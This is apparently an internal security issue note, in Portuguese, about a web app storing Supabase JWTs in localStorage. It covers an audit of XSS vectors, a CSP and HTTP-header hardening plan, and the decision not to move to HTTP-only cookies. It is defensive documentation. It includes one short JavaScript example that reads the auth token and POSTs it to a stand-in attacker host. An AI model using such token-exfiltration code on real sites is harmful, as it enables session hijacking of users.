---
title: JWT em localStorage - superfície de XSS
tags: [issue, security]
severity: high
status: mitigated
last-update: 2026-05-01
---

# JWT em localStorage - superfície de XSS

## Contexto

O Supabase Auth client do Sonnar guarda `access_token` e `refresh_token` em `window.localStorage` (configuração padrão de SPA). Qualquer script com permissão de execução na origem consegue ler esses valores e usar a sessão até `expires_at` (e refrescar indefinidamente via `refresh_token`).

O cenário de risco é XSS: se um atacante injetar `<script>` no DOM via input não-sanitizado, dado vindo do banco renderizado como HTML, dependência comprometida (supply chain), ou anúncio de terceiro, ele rouba a sessão sem precisar de phishing nem MFA.

## Reprodução conceitual

```js
// Hipotético código injetado em qualquer ponto da app
const token = localStorage.getItem('sb-cqiaiwpjrxqxvhvmcgfs-auth-token')
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: token,
  mode: 'no-cors'
})
```

Isso vence:
- Backend (atacante usa o JWT direto contra Supabase com mesmo poder do usuário).
- RLS (do ponto de vista do banco, é o usuário legítimo).
- Inactivity timeout (atacante refresha automaticamente).
- 2FA (não tem).

## Auditoria da superfície atual (v1.8.2)

| Vetor                                    | Estado                                                                  |
| ---------------------------------------- | ----------------------------------------------------------------------- |
| `v-html` em `BenefitsSection.vue:24`     | ✅ Renderiza SVG hardcoded em `data()` - sem dado externo               |
| `v-html` em `DashboardLayout.vue:37`     | ✅ Renderiza SVG hardcoded em `navItems` - sem dado externo             |
| `innerHTML` em `MapSection.vue:386,409`  | ✅ Lê SVG de `/Brazil_states.svg` e `/world.svg` (mesma origem, controlado) |
| `eval` / `new Function`                  | ✅ Não usados                                                           |
| `document.write`                         | ✅ Não usado                                                            |
| Renderização de markdown user-supplied   | ✅ Não há                                                               |
| Iframes embedados                        | ✅ Apenas Stripe Checkout (origem confiável)                            |
| Headers de segurança no servidor         | ⚠️ Pré-v1.9.0: só `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`. **Sem CSP, HSTS, Permissions-Policy.** |

A superfície de XSS no código próprio é mínima. O risco principal vem de:
1. Dependências NPM comprometidas (supply chain).
2. Conteúdo gerado por usuário no futuro (descrições de vagas, comentários - não existe ainda).
3. Vetores de browser não-mitigados (extensões maliciosas - fora do nosso controle).

## Mitigação aplicada (v1.9.0)

### Content Security Policy estrita

`index.html` recebeu meta tag CSP com:

- `default-src 'self'` - bloqueia tudo por padrão.
- `script-src 'self' 'sha256-...' 'sha256-...'` - só scripts da própria origem mais hashes específicos dos 2 blocos JSON-LD inline. **Sem `'unsafe-inline'`, sem `'unsafe-eval'`.**
- `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com` - Vue/Vite injetam style attributes; impacto de XSS via CSS é baixo.
- `connect-src 'self' https://*.supabase.co wss://*.supabase.co https://api.stripe.com` - só esses backends.
- `frame-src https://js.stripe.com https://hooks.stripe.com https://checkout.stripe.com` - Stripe Checkout em iframe.
- `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`, `upgrade-insecure-requests`.

### Headers HTTP adicionais (`.htaccess`)

- `Strict-Transport-Security: max-age=31536000; includeSubDomains` (1 ano).
- `Permissions-Policy: ... payment=(self) ...` - bloqueia hardware/sensores não usados.
- `Cross-Origin-Opener-Policy: same-origin`.
- `Cross-Origin-Resource-Policy: same-site`.
- `X-XSS-Protection: 0` (deprecated; CSP é a defesa real).
- Mantidos: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`.

### Resultado

Mesmo que um atacante consiga injetar JavaScript via XSS, a CSP impede:
- Carregar script de domínio externo.
- Executar `eval()` ou `new Function()`.
- Fazer `fetch()` para domínio fora do `connect-src` (ou seja, **não consegue exfiltrar o token**).
- Submeter form para domínio externo.

A superfície real de impacto fica **redução agressiva, não eliminação**.

## Por que não migrar para HTTP-only cookies

Migração exigiria:
- Build de um BFF (Edge Function ou serviço próprio) que segura o token e expõe endpoints com session cookie.
- Reescrever todas as chamadas `supabase.from(...)` pra passar pelo proxy ou usar SSR (Nuxt).
- Re-implementar refresh token, expiry, OAuth callback no proxy.

Trade-off explícito: ganho de segurança real **vs.** semanas de engenharia + nova superfície de bugs no proxy. **Decidido (em [[../12-decisions/ADR-002-jwt-storage-csp-hardening]]) aceitar o risco com mitigações de defesa em profundidade**, reavaliar em pelo menos um destes gatilhos:

1. Surge requisito de conteúdo gerado por usuário (vagas com descrição livre, comentários, suporte).
2. Auditoria externa (LGPD, SOC2, ISO) exigir.
3. Adoção em conta paga ≥ N (metric a definir).
4. Bug de XSS detectado em produção.

## Plano (próximos passos)

- [ ] Configurar **CSP report-uri** (depois de validar 1 semana sem violações em produção, configurar `Content-Security-Policy-Report-Only` em paralelo apontando pra um endpoint de coleta - Sentry ou Edge Function dedicada).
- [ ] Adicionar **Subresource Integrity** (SRI) para Google Fonts CSS via plugin Vite.
- [ ] Audit periódico de deps com `npm audit` no CI (já existe? confirmar `.github/workflows/security.yml`).
- [ ] Considerar **Trusted Types** policy quando Vue 3 oferecer suporte first-class (hoje só com workaround manual).

## Como testar

1. `npm run preview` (após `npm run build`).
2. Abrir DevTools → Console.
3. Navegar pelas rotas (landing, login, dashboard, admin, payment).
4. **Não** deve aparecer nenhum log `Refused to execute inline script` ou `Refused to connect to ...`.
5. Comportamento funcional do app deve ser idêntico.

## Relações

- [[../10-security/auth-model]]
- [[../12-decisions/ADR-002-jwt-storage-csp-hardening]]
- [[../12-decisions/ADR-001-auth-hardening]]

## Referências

- `index.html` (CSP meta tag)
- `public/.htaccess` (security headers)
- `src/integrations/supabase/client.ts:14-21` (config `storage: localStorage`)
- Especificações: [CSP Level 3](https://www.w3.org/TR/CSP3/), [HSTS RFC 6797](https://datatracker.ietf.org/doc/html/rfc6797), [COOP](https://html.spec.whatwg.org/multipage/origin.html#cross-origin-opener-policies)
